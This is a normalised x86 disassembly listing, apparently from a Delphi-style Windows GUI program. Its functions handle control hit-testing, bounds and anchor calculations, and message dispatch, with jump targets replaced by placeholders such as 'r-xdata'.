mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43d1e4
pop esi
pop ebx
retn
sub_43d439
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43d1e4
pop esi
pop ebx
retn
sub_43d464
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43d494
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43cc64
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_452834
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403420
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_452834
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403420
sub_43d50c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43d544
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_452834
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403420
sub_43d57c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43be04
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43d544
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406878
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403420
sub_43d5f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43d544
pop esi
pop ebx
retn
sub_43d614
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43d544
pop esi
pop ebx
retn
sub_43d634
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_452834
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403420
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_446d24
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d68c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43bdf4
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43be04
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43cd98
pop esi
retn
sub_43d6cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43cdcc
sub_43d77a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43c014
mov cl 0x1
sub_43d7bc
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43bd6c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43bd6c
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43d7ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43d810
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406878
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403420
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43cd98
mov [ ebx + 0xc ] eax
sub_43d8b4
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43bcc0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43bcc0
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43d948
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40316c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43b360
mov edx [ esp ]
mov eax esi
call sub_43b33c
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43b5e8
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43b62c
sub_43d9cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_4124bc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43b6e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_41250c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43b58c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43da58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43d948
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4423cc
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43d9cc
pop ecx
jmp r-xdata
sub_43dab8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43dba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dbad
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43bbfc
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43bbcc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43bbcc
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404368
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403fb0
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43baec
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43dbb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403420
sub_43dbe0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43dc00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43dc20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43dc40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43dc60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43dc80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43dca0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419840
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43b220
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403420
sub_43dcd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43dd74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413fa0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_448530
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_448668
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4483c8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_448788
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dd7b
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_43dd84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43ddc0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43dd84
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43de70
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033b0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43dea4
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43dec4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403420
test al al
je r-xdata
mov eax edi
call sub_43df04
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43df30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43df5c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406878
mov eax esp
call sub_412534
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43b710
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403420
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403420
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43b73c
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412534
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_4124bc
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43b6e4
sub_43e084
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_43e0c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a910
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43e0f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43e1f0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43accc
push ebx
push sub_43fb88
call sub_41a480
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cae8
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41cc90
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403530
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459604
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403fb0
lea eax [ ebx + 0x188 ]
call sub_403f5c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e1f7
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
sub_43e1f7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_43e21c
push ebx
push esi
push edi
call sub_403598
mov ebx edx
mov edi eax
mov eax edi
call sub_419690
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405598
mov eax [ edi + 0x178 ]
call sub_403224
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_439878
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_43eebc
mov eax edi
call sub_43f0fc
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403224
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_43f0c0
mov esi eax
mov edx esi
mov eax edi
call sub_43ef28
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_43f0fc
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43ada4
test bl bl
jle r-xdata
call sub_41a518
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403580
sub_43e2ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43e3b0
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413ab8
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403224
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_44258c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413918
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413a0c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413918
test eax eax
je r-xdata
sub_43e3c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor eax eax
push ebp
push sub_43e400
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e407
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
sub_43e407
mov eax [ ebp - 0x4 ]
call sub_43e2ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fac0
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43cd98
sub_43e43c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43e457 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43e4c8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
